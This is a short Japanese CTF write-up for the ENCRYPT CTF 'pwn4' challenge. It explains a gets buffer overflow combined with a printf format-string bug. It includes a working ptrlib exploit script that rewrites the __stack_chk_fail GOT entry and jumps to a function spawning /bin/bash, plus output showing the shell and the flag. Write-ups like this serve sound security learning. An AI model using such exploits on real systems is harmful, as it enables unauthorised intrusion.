# [pwn 300pts] pwn4 - ENCRYPT CTF
このCTF最後のpwnです。
32bitバイナリでSSPが有効です。
```
$ checksec pwn4
[*] 'pwn4'
    Arch:	32 bits (little endian)
    NX:		NX enabled
    SSP:	SSP enabled (Canary found)
    RELRO:	No RELRO
    PIE:	PIE disabled
```
まずはIDAで解析します。
やはりgetsによるオーバーフローがあるのですが、printfによるFSBもあります。
さらに`/bin/bash`を呼び出す`__`関数もあるので、これが呼び出せればOKです。

ということで、getsでリターンアドレスを`__`のアドレスに書き換えた後、FSBで`__stack_chk_fail`のGOTをret gadgetにしてやれば良さそうです。
もちろんFSBで全部済ましても問題ありません。

せっかくなので32ビット用にFSBのpayloadを作ってくれる関数をptrlibに追加しました。
現状ではpwntoolsのfmtstr_payloadと同じ機能ですが、今後64ビットへの対応や、書き込み対象アドレスにnullバイトが入っている際の対応なども自動でしてくれる機能を搭載する予定です。

```python
from ptrlib import *

elf = ELF("./pwn4")
sock = Process("./pwn4")

rop_ret = 0x0804838a
writes = {
    elf.got("__stack_chk_fail"): rop_ret
}

payload = b''
payload += fsb(
    pos = 7,
    writes = writes,
    bs = 1,
    written = 0
)
payload += b'A' * (0x90 - len(payload))
payload += p32(elf.symbol("__"))
sock.sendline(payload)
sock.interactive()
```

できました。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=11191)
[ptrlib]$ Do you swear to use this shell with responsility by the old gods and the new?

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=

i don't belive you!
%122c%7$hhn%249c%8$hhn%129c%9$hhn%4c%10$hhnAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=

cat flag.txt
encryptCTF{Y0u_4R3_7h3_7ru3_King_0f_53v3n_KingD0ms}
[ptrlib]$
```

# 感想
ENCRYPT CTFは全体的に簡単だったので少し癒やされました。
